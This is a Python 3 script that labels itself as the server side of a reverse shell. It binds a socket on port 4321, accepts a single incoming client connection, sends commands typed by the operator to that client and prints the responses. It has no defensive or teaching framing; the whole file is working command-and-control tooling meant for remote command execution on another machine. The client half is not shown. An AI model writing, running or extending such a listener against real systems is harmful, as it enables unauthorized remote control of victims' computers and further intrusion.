#-----------------------------------------PYTHON-3 REVERSE_SHELL-(SINGLE_CLINET)----------------------------------------
# Required modules
import socket
import sys

# socket creation
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 4321              # Enter any port no here. make sure it should'nt be a well-known port
        s = socket.socket()

    except socket.error as error:
        print('Socket creation Error:'+str(error))

# Binding the socket to the host and port no
def socket_bind():
    try:
        global host
        global port
        global s
        print('[+]Binding the socket to our address...')
        s.bind((host, port))
        s.listen(5)

    except socket.error as error:
        print('Socket binding error:'+str(error)+'\nRetrying...')
        socket_bind()

# Accepting the incoming connection from our client
def socket_accept():
        conn, address = s.accept()
        print(f'[+]Connection established from address:{address[0]} via port:{str(address[1])}')
        send_commands(conn)
        conn.close()

# Sending the commands to the client
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = conn.recv(50000)
            print(client_response.decode('utf-8'), end="")

# initalizing the functions of server
def main():
    create_socket()
    socket_bind()
    socket_accept()

main()    # Function Call
